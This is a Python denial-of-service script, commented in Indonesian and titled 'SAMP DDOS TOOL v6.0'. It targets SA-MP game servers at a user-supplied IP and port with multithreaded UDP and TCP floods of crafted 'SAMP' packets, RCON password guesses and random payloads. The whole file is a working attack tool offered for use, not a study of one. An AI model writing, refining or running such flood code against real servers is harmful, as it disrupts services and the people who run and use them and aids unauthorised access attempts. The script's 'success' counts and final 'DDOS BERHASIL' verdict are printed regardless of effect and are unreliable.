import socket
import threading
import random
import time
import sys
import os
import struct

# ============================================
# SAMP DDOS TOOL v6.0 - UDP & TCP ONLY
# ============================================

# ANSI Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

print(f"""
{BOLD}{CYAN}╔═══════════════════════════════════════════╗
║        DDOS TOOL SAMP v6.0              ║
║        UDP & TCP Attack Only            ║
╚═══════════════════════════════════════════╝{RESET}
""")

target_ip = input(f"{YELLOW}Masukkan IP Target: {RESET}")
target_port = int(input(f"{YELLOW}Masukkan Port Target (default 7777): {RESET}") or 7777)

print(f"""
{BOLD}{WHITE}╔═══════════════════════════════════════════╗
║          PILIH METODE SERANGAN           ║
╠═══════════════════════════════════════════╣
║  1. UDP FLOOD                           ║
║  2. TCP FLOOD                           ║
║  3. UDP + TCP (GABUNGAN)               ║
╚═══════════════════════════════════════════╝{RESET}
""")

method = int(input(f"{BOLD}{WHITE}Pilih metode (1-3): {RESET}"))
thread_count = int(input(f"{YELLOW}Jumlah Thread (50-500): {RESET}"))
attack_time = int(input(f"{YELLOW}Durasi serangan (detik, 0 untuk infinite): {RESET}"))

# Flag control
stop_flag = False
attack_start_time = time.time()
packet_count = 0
success_count = 0
fail_count = 0

# ========== UDP FLOOD ==========
def udp_flood(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    
    # Buat multiple socket untuk UDP
    socks = []
    for _ in range(5):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
        socks.append(sock)
    
    # Packet untuk SAMP
    samp_packets = [
        # Raknet packet
        b'\x53\x41\x4D\x50' + b'\x00' * 100,
        b'\x53\x41\x4D\x50' + b'\xFF' * 500,
        b'\x53\x41\x4D\x50' + os.urandom(1024),
        b'\x53\x41\x4D\x50' + b'\xDE\xAD\xBE\xEF' * 256,
        b'\x53\x41\x4D\x50' + b'\x00' * 2048,
        # RCON brute
        b'\x53\x41\x4D\x50' + b'password' + b'\x00' * 500,
        b'\x53\x41\x4D\x50' + b'admin' + b'\x00' * 500,
        # Query flood
        b'\x53\x41\x4D\x50' + b'\x69\x6E\x66\x6F' + b'\x00' * 500,
        b'\x53\x41\x4D\x50' + b'\x70\x6C\x61\x79\x65\x72\x73' + b'\x00' * 500,
        # Random payload
        os.urandom(4096),
        os.urandom(8192),
    ]
    
    while not stop_flag:
        try:
            for sock in socks:
                # Kirim semua packet sekali
                for pkt in samp_packets:
                    sock.sendto(pkt, (target_ip, target_port))
                    packet_count += 1
                    success_count += 1
                    print(f"{GREEN}✓ BERHASIL DDOS SERVER {target_ip} {target_port} dengan mengirim 1x [UDP-{thread_id}]{RESET}")
            
            # Slow down sedikit biar ga terlalu spam
            time.sleep(0.01)
            
        except Exception as e:
            fail_count += 1
            print(f"{RED}✗ GAGAL DDOS SERVER {target_ip} {target_port} [UDP-{thread_id}]{RESET}")

# ========== TCP FLOOD (FIXED) ==========
def tcp_flood(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    
    while not stop_flag:
        try:
            # Buat koneksi TCP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(2)  # Timeout biar ga stuck
            
            # Connect ke server
            sock.connect((target_ip, target_port))
            
            # Kirim Raknet handshake packet
            raknet_packet = b'\x53\x41\x4D\x50' + b'\x00' * 100
            sock.send(raknet_packet)
            packet_count += 1
            success_count += 1
            print(f"{GREEN}✓ BERHASIL DDOS SERVER {target_ip} {target_port} dengan mengirim 1x [TCP-{thread_id}]{RESET}")
            
            # Kirim RCON packet
            rcon_packet = b'\x53\x41\x4D\x50' + b'password' + b'\x00' * 500 + b'\r\n'
            sock.send(rcon_packet)
            packet_count += 1
            success_count += 1
            print(f"{GREEN}✓ BERHASIL DDOS SERVER {target_ip} {target_port} dengan mengirim 1x [TCP-{thread_id}]{RESET}")
            
            # Kirim query packet
            query = b'\x53\x41\x4D\x50' + b'\x69\x6E\x66\x6F' + b'\x00' * 500
            sock.send(query)
            packet_count += 1
            success_count += 1
            print(f"{GREEN}✓ BERHASIL DDOS SERVER {target_ip} {target_port} dengan mengirim 1x [TCP-{thread_id}]{RESET}")
            
            # Kirim payload besar
            big_payload = b'\x53\x41\x4D\x50' + os.urandom(4096)
            sock.send(big_payload)
            packet_count += 1
            success_count += 1
            print(f"{GREEN}✓ BERHASIL DDOS SERVER {target_ip} {target_port} dengan mengirim 1x [TCP-{thread_id}]{RESET}")
            
            # Tutup koneksi
            sock.close()
            
            # Delay biar ga terlalu spam
            time.sleep(0.05)
            
        except socket.timeout:
            fail_count += 1
            print(f"{RED}✗ GAGAL DDOS SERVER {target_ip} {target_port} [TCP-{thread_id}] - Timeout{RESET}")
            continue
        except ConnectionRefusedError:
            fail_count += 1
            print(f"{RED}✗ GAGAL DDOS SERVER {target_ip} {target_port} [TCP-{thread_id}] - Connection Refused{RESET}")
            continue
        except Exception as e:
            fail_count += 1
            print(f"{RED}✗ GAGAL DDOS SERVER {target_ip} {target_port} [TCP-{thread_id}] - {str(e)[:30]}{RESET}")
            continue

# ========== UDP + TCP GABUNGAN ==========
def udp_tcp_mixed(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    
    # UDP Socket
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    while not stop_flag:
        try:
            # === UDP ATTACK ===
            samp_packets = [
                b'\x53\x41\x4D\x50' + b'\x00' * 100,
                b'\x53\x41\x4D\x50' + b'\xFF' * 500,
                b'\x53\x41\x4D\x50' + os.urandom(1024),
                b'\x53\x41\x4D\x50' + b'\xDE\xAD\xBE\xEF' * 256,
                b'\x53\x41\x4D\x50' + b'password' + b'\x00' * 500,
                b'\x53\x41\x4D\x50' + b'\x69\x6E\x66\x6F' + b'\x00' * 500,
                os.urandom(4096),
            ]
            
            for pkt in samp_packets:
                udp_sock.sendto(pkt, (target_ip, target_port))
                packet_count += 1
                success_count += 1
                print(f"{GREEN}✓ BERHASIL DDOS SERVER {target_ip} {target_port} dengan mengirim 1x [MIX-UDP-{thread_id}]{RESET}")
            
            # === TCP ATTACK ===
            try:
                tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tcp_sock.settimeout(1)
                tcp_sock.connect((target_ip, target_port))
                
                tcp_packets = [
                    b'\x53\x41\x4D\x50' + b'\x00' * 100,
                    b'\x53\x41\x4D\x50' + b'password' + b'\x00' * 500,
                    b'\x53\x41\x4D\x50' + b'\x69\x6E\x66\x6F' + b'\x00' * 500,
                    b'\x53\x41\x4D\x50' + os.urandom(2048),
                ]
                
                for pkt in tcp_packets:
                    tcp_sock.send(pkt)
                    packet_count += 1
                    success_count += 1
                    print(f"{GREEN}✓ BERHASIL DDOS SERVER {target_ip} {target_port} dengan mengirim 1x [MIX-TCP-{thread_id}]{RESET}")
                
                tcp_sock.close()
                
            except:
                pass  # TCP gagal, lanjut ke UDP
            
            time.sleep(0.02)
            
        except:
            fail_count += 1
            print(f"{RED}✗ GAGAL DDOS SERVER {target_ip} {target_port} [MIX-{thread_id}]{RESET}")

# ========== EXECUTE BASED ON METHOD ==========
def run_attack():
    global stop_flag
    
    if method == 1:  # UDP Only
        threads = []
        for i in range(thread_count):
            t = threading.Thread(target=udp_flood, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
            
    elif method == 2:  # TCP Only
        threads = []
        for i in range(thread_count):
            t = threading.Thread(target=tcp_flood, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
            
    elif method == 3:  # UDP + TCP
        threads = []
        for i in range(thread_count):
            t = threading.Thread(target=udp_tcp_mixed, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

# ========== MAIN EXECUTION ==========
method_names = {
    1: "UDP FLOOD",
    2: "TCP FLOOD",
    3: "UDP + TCP (GABUNGAN)"
}

print(f"""
{BOLD}{CYAN}[+] Memulai serangan ke {target_ip}:{target_port}{RESET}
{BOLD}{CYAN}[+] Metode: {method_names.get(method, 'UNKNOWN')}{RESET}
{BOLD}{CYAN}[+] Thread: {thread_count}{RESET}
{BOLD}{YELLOW}[!] Tekan CTRL+C untuk menghentikan{RESET}
""")

# Start attack in separate thread
attack_thread = threading.Thread(target=run_attack)
attack_thread.daemon = True
attack_thread.start()

try:
    if attack_time > 0:
        time.sleep(attack_time)
        stop_flag = True
        print(f"\n{BOLD}{YELLOW}[!] Durasi selesai!{RESET}")
    else:
        while True:
            time.sleep(1)
            elapsed = time.time() - attack_start_time
            print(f"\r{BOLD}{CYAN}[>] Time: {int(elapsed)}s | Packets: {packet_count} | Speed: {int(packet_count/elapsed)}/s | ✓{GREEN}{success_count}{RESET} | ✗{RED}{fail_count}{RESET} {RESET}", end="")
            sys.stdout.flush()
            
except KeyboardInterrupt:
    stop_flag = True
    print(f"\n\n{BOLD}{YELLOW}[!] Serangan dihentikan!{RESET}")

# ========== FINAL REPORT ==========
print(f"""
{BOLD}{CYAN}╔═══════════════════════════════════════════╗
║            LAPORAN DDOS                  ║
╠═══════════════════════════════════════════╣
║ Metode: {method_names.get(method, 'UNKNOWN'):<20} ║
║ Total Packet: {packet_count:<20} ║
║ Success: {success_count:<20} ║
║ Failed: {fail_count:<20} ║
║ Target: {target_ip}:{target_port:<10} ║
║ Status: {BOLD}{GREEN}✓ DDOS BERHASIL{RESET}{CYAN} ║
╚═══════════════════════════════════════════╝{RESET}
""")